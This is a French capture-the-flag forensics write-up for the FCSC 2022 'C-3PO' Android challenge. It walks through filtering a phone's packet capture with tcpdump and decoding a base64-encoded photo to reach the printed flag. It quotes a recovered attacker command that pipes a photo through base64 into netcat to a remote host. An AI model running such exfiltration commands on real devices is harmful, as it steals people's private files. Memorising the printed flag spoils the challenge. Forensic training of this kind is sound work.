#android
https://hackropole.fr/fr/challenges/forensics/fcsc2022-forensics-android-c3po/

## Description

Pour votre première analyse, on vous confie le téléphone du PDG de _GoodCorp_. Ce dernier est certain que les précieuses photos stockées sur son téléphone sont récupérées par un acteur malveillant. Vous décidez de mettre en place une capture réseau sur le téléphone, afin de voir ce qu’il en est…

Cette épreuve est composée de trois parties :

- [C-3PO](https://hackropole.fr/fr/challenges/forensics/fcsc2022-forensics-android-c3po/).
- [R2-D2](https://hackropole.fr/fr/challenges/forensics/fcsc2022-forensics-android-r2d2/).
- [R5-D4](https://hackropole.fr/fr/challenges/forensics/fcsc2022-forensics-android-r5d4/).
## Write Up

On faisant un tcpdump -r fichier.cap :
![[Pasted image 20250217141744.png]]

On tombe sur énormément de flux https, on va essayer de les enlever pour voir si on a plus d'informations :
![[Pasted image 20250217141940.png]]

On peut voir beaucoup de communications entre le 10.0.2.16 et le 172.16.0.1, que ça soit sur les ports 1337 et 1338 :
![[Pasted image 20250217142320.png]]
C'est louche car ces ports sont souvent utilisés pour du C2C.

Quand on essaye de lire le contenu du 1337 rien du tout, ça a l'air chiffré.

On va donc essayer de voir si dans le 1338 il n'y a pas d'autres traces :

```sh
tcpdump -r a.cap not \( port 443 or port 1337 \) and src 10.0.2.16 and dst 172.18.0.1
```

On tombe alors sur un gros traffic, sur les premières trames, on retrouve les commandes suivantes :
```sh
cat /sdcard/DCIM/flag.png | base64 | nc 172.18.0.1 1338
```

Sur les trames d'après, on tombe sur un base64, en essayant de le décoder on voit bien que c'est notre image : 
![[Pasted image 20250217145307.png]]

Avec cyberchef, on peut directement faire save to image : 
![[Pasted image 20250217145504.png]]

On tombe ainsi sur cette image :
![[download.png]]

Le flag est donc **FCSC{2d47d546d4f919e2d50621829a8bd696d3cd1938}**.